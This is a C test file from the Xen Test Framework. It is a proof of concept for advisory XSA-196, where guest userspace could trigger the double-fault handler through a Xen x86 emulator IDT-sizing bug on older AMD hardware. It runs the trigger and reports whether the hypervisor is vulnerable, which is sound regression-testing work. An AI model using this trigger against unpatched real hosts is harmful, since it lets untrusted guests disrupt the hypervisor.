/**
 * @file tests/xsa-196/main.c
 * @ref test-xsa-196
 *
 * @page test-xsa-196 XSA-196
 *
 * Advisory: [XSA-196](http://xenbits.xen.org/xsa/advisory-196.html)
 *
 * Xen change [36ebf14ebe](http://xenbits.xen.org/gitweb/
 * ?p=xen.git;a=commitdiff;h=36ebf14ebe60310aa22952cbb94de951c158437d)
 * contained a bug when calculating the correct size of an IDT entry.
 *
 * This means that a 16 or 32bit code segment running under a 64bit kernel
 * will cause the x86 emulator to look at the wrong location in the IDT when
 * performing the DPL/Presence checks.  As @#OF is typically a DPL3
 * descriptor, guest userspace can end up invoking @#DF, reserved for a
 * critical malfunction.
 *
 * This vulnerability is restricted to AMD Hardware lacking NRip support.
 * More modern AMD hardware, and all Intel hardware bypass the buggy logic in
 * Xen.
 *
 * @see tests/xsa-196/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-196 PoC";

bool test_wants_user_mappings = true;
bool test_needs_fep = true;

void custom_doublefault_handler(void);
asm(".align 16;"
    "custom_doublefault_handler:"
    /* Fake up "return EXINFO_SYM(DF, 0);" */
    "mov $(1 << 31 | " STR(X86_EXC_DF) " << 16), %eax;"
    "iretq;"
    );

unsigned long compat_userspace(void)
{
    exinfo_t fault = 0;

    asm volatile (/* Drop into a 32bit compat code segment. */
                  "push $%c[cs32];"
                  "push $1f;"
                  "lretq; 1:"

                  /* Force `int $8` through the emulator. */
                  ".code32;"
                  "start_32bit:;"
                  _ASM_XEN_FEP
                  "1: int $%c[df]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, ex_record_fault_eax)

                  /* Return to 64bit. */
                  "ljmpl $%c[cs], $1f;"
                  "end_32bit:;"

                  ".code64; 1:"
                  : "+a" (fault)
                  : [df]   "i" (X86_EXC_DF),
                    [cs32] "i" (__USER_CS32),
                    [cs]   "i" (__USER_CS),
                    "X" (ex_record_fault_eax));

    return fault;
}

void test_main(void)
{
    /*
     * Sanity check the preconditions for this PoC working.  These settings
     * are very common.
     */
    ASSERT(idt[X86_EXC_OF].dpl == 3);
    ASSERT(idt[X86_EXC_DF].dpl == 0);

    struct xtf_idte idte =
    {
        .addr = _u(custom_doublefault_handler),
        .cs   = __KERN_CS,
        .dpl  = 0,
    };

    /* Hook the custom doublefault handler. */
    xtf_set_idte(X86_EXC_DF, &idte);

    exinfo_t fault = exec_user(compat_userspace);

    switch ( fault )
    {
    case EXINFO_SYM(GP, EXC_EC_SYM(DF, IDT)):
        xtf_success("Success: #DF DPL was checked correctly\n");
        break;

    case EXINFO_SYM(DF, 0):
        xtf_failure("Fail: Userspace managed to invoke #DF\n");
        break;

    default:
        xtf_error("Error: Unexpected fault %#x\n", fault);
        break;
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
